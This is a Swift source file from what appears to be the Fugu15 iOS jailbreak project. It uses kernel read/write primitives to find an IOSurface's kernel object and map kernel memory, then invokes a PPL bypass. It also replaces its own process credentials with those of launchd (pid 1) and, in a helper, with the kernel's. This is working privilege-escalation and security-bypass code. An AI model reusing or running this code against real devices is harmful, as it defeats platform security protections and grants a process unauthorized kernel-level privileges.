//
//  Test.swift
//  Fugu15
//
//  Created by Linus Henze on 2023-01-13.
//  Copyright © 2023 Pinauten GmbH. All rights reserved.
//  

import Foundation
import KernelPatchfinder
import KRW
import IOSurface
import KRWC


let pf = KernelPatchfinder.running!

/*  code signing attributes of a process  */
let CS_HARD =             UInt32(0x00000100)  /* don't load invalid pages */
let CS_KILL =             UInt32(0x00000200)  /* kill process if it becomes invalid */
let CS_RESTRICT =         UInt32(0x00000800)  /* tell dyld to treat restricted */
let CS_ENFORCEMENT =      UInt32(0x00001000)  /* require enforcement */
let CS_REQUIRE_LV  =      UInt32(0x00002000)  /* require library validation */
let CS_PLATFORM_BINARY =  UInt32(0x04000000)  /* this is a platform binary */
let CS_VALID =            UInt32(0x00000001)  /* dynamically valid */
let CS_SIGNED =           UInt32(0x20000000)  /* process has a signature (may have gone invalid) */
let CS_ADHOC =            UInt32(0x00000002)  /* ad hoc signed */
let CS_GET_TASK_ALLOW =   UInt32(0x00000004)  /* has get-task-allow entitlement */
let CS_INSTALLER  =       UInt32(0x00000008)  /* has installer entitlement */
let CS_FORCED_LV =        UInt32(0x00000010)  /* Library Validation required by Hardened System Policy */
let CS_INVALID_ALLOWED =  UInt32(0x00000020)  /* (macOS Only) Page invalidation allowed by task port policy */
let CS_PLATFORM_PATH =    UInt32(0x08000000)  /* platform binary by the fact of path (osx only) */
let CS_EXEC_INHERIT_SIP = UInt32(0x00800000)  /* set CS_INSTALLER on any exec'ed process */
let CS_TF_PLATFORM =         UInt32(0x00000400)  /* set testflight? */
/*========================================*/

func getSurfacePort(magic: UInt64 = 1337) throws -> mach_port_t {
    let surf = IOSurfaceCreate([
        kIOSurfaceWidth: 120,
        kIOSurfaceHeight: 120,
        kIOSurfaceBytesPerElement: 4
    ] as CFDictionary)
    
    let port = IOSurfaceCreateMachPort(surf!)
    
    KRW.logger("Base: \(IOSurfaceGetBaseAddress(surf!))")
    KRW.logger("Size: \(IOSurfaceGetAllocSize(surf!))")
    
    IOSurfaceGetBaseAddress(surf!).assumingMemoryBound(to: UInt64.self).pointee = magic
    
    //try dumpSurface(port: port)
    
    IOSurfaceDecrementUseCount(surf!)
    
    return port
}

var realUcred: UInt64?


func uptime() -> Int {
    var currentTime = time_t()
    var bootTime = timeval()
    var mib = [CTL_KERN, KERN_BOOTTIME]
    var size = MemoryLayout<timeval>.stride
    let result = sysctl(&mib, u_int(mib.count), &bootTime, &size, nil, 0)
    if result != 0 {
        return 0
    }
    time(&currentTime)
    var uptime = currentTime - bootTime.tv_sec
    let days = uptime / 86400
    uptime %= 86400
    let hrs = uptime / 3600
    uptime %= 3600
    let mins = uptime / 60
    if mins != 0 || hrs != 0 || days != 0 {
        return 60
    }
    
    let secs = uptime % 60

    return secs
}


func testkrwstuff() throws {
    let boot_time = uptime()
    KRW.logger("[+] Got uptime:\(boot_time)")
    if boot_time < 60 {
        KRW.logger("[+] Waiting for system to cool down after boot")
        for i in 0...(60-boot_time) {
            KRW.logger("[+] \(60-boot_time-i)")
            sleep(1)
        }
    }
    
    let port = try getSurfacePort()
    KRW.logger("[+] Port: \(port)")
    let ourPid = getpid()
    KRW.logger("[+] OurPid: \(ourPid)")

    guard let virt = try? KRW.ourProc?.task!.getKObject(ofPort: port) else {
        KRW.logger("[-] Failed to get our proc - close app and try again in 15 seconds. Likely kernelexploit failed. If it is a first app install - go to and choose kernelexploit in exploit picker")
        throw KRWError.failedToGetOurProc
    }
    
    KRW.logger("[+] Got ourProc of port \(virt)")
    let surface = try KRW.rPtr(virt: virt + 0x18/* IOSurfaceSendRight->IOSurface */)
    
    let surfaceBase = surface & ~0x3FFF
    let surfaceOff  = surface & 0x3FFF
    
    let mapped = try KRW.map(virt: surfaceBase, size: 0x4000)
    
    try print("krw r64: \(KRW.r64(virt: surface))")
    print("mapped: \(mapped!.advanced(by: Int(surfaceOff)).assumingMemoryBound(to: UInt64.self).pointee)")
    print("Hilo!")
    
    
    try KRW.logger("krw r64: \(KRW.r64(virt: surface))")
    KRW.logger("mapped: \(mapped!.advanced(by: Int(surfaceOff)).assumingMemoryBound(to: UInt64.self).pointee)")
    
    try KRW.doPPLBypass()
    
    realUcred = KRW.ourProc?.ucred
    KRW.ourProc?.ucred = try Proc(pid: 1)?.ucred
}

func withKernelCredentials<T>(_ block: () throws -> T) rethrows -> T {
    let saved = KRW.ourProc?.ucred
    KRW.ourProc?.ucred = KRW.kernelProc?.ucred
    defer { KRW.ourProc?.ucred = saved }
    
    return try block()
}

func restoreRealCreds() {
    KRW.ourProc?.ucred = realUcred
}
